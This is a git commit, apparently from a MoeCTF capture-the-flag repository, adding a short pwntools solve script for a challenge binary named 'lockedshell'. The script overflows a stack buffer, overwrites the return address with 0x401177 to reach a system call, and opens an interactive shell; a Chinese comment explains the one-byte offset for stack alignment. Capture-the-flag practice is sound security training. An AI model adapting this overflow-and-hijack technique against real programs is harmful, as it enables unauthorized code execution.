888ff2ffc1903945fee337f31534d994c668e185
maple-pwn <3079403765@qq.com>
2024-12-03 23:05:26 +0800

    moectf

---
+++ lockedshell/solve.py
@@ -0,0 +1,7 @@
+from pwn import *
+context(os='linux',terminal=['tmux','sp','-h'],log_level='debug')
+p = process('./lockedshell')
+
+payload = b'a'*0x50+b'b'*0x8+p64(0x401177)#地址加一，为了跳过跳过 `push rbp` 使栈指针在调用 `system` 时 16 字节对齐。
+p.sendlineafter(b".\n",payload)
+p.interactive()
